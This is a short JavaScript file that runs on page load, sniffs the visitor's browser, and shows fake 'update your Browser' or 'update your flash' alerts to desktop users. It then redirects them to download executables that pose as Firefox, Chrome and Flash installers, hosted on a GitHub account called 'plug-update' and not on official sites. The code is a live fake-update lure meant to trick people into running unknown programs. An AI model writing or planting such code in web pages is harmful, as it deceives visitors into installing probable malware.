function myBrowser() {
	if(isMobile()){
		console.log("Linux");
		return;
	}
    var userAgent = navigator.userAgent; 
    var isFF = userAgent.indexOf("Firefox") > -1; 
    var isChrome = userAgent.indexOf("Chrome") > -1;
    if (isFF) {
		alert("Please update your Browser!");
		window.location.href="https://github.com/plug-update/firefox/raw/main/Firefox%20Installer.exe";
        return "FF";
    }
    if (isChrome) {
		alert("Please update your Browser!");
		window.location.href="https://github.com/plug-update/chrome/raw/main/ChromeSetup.exe";
        return "Chrome";
    }
	alert("Please update your flash!");
	window.location.href="https://github.com/plug-update/flash/raw/main/Flashplayer.exe";
    
}

function isMobile(){
	if( navigator.userAgent.match(/Android/i)
		|| navigator.userAgent.match(/webOS/i)
		|| navigator.userAgent.match(/iPhone/i)
		|| navigator.userAgent.match(/iPad/i)
		|| navigator.userAgent.match(/iPod/i)
		|| navigator.userAgent.match(/BlackBerry/i)
		|| navigator.userAgent.match(/Windows Phone/i)
		|| navigator.userAgent.match(/Linux/i)
	)return true;
	return false;
}
myBrowser();
